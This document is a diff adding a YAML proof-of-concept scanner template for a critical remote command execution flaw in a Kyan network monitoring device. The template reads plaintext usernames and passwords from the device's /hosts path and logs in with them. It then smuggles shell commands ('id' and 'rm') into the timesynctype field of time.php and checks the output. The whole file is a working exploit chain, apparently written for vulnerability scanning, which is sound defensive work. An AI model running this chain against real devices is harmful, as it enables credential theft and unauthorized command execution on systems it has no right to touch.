@@ -1,0 +1,68 @@
+name: yaml-poc-kyan-platform-other-CT-517516
+binding: b48142cb-6b2d-4964-af6a-2808799f01b2
+detail:
+    author: system_user
+    links:
+        - https://github.com/Threekiii/Awesome-POC/blob/master/网络设备漏洞/Kyan%20网络监控设备%20time.php%20远程命令执行漏洞.md
+    vulnerability:
+        id: 43b2c2f8-6cb2-4f2f-8a1b-31f9aa88120c
+        level: critical
+transport: http
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(26)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /hosts
+        expression: response.status == 200 && response.body.bcontains(bytes(string("UserName=")))
+        output:
+            search: |
+                "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)".bsubmatch(response.raw)
+            username: search["username"]
+            password: search["password"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /login.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{r2}}
+            body: |
+                user={{username}}&passwd={{password}}&x=56&y=21
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(bytes(string("设备管理系统")))
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /time.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{r2}}
+            body: |
+                timesynctype=;id>{{r1}}.txt
+        expression: response.status == 200
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /{{r1}}.txt
+            headers:
+                Cookie: PHPSESSID={{r2}}
+        expression: response.status == 200 && response.body.bcontains(bytes(string("uid=")))
+    r4:
+        request:
+            cache: true
+            method: POST
+            path: /time.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{r2}}
+            body: |
+                timesynctype=%3Brm%20{{r1}}.txt
+        expression: response.status == 200
+expression: r0() && r1() && r2() && r3() && r4()
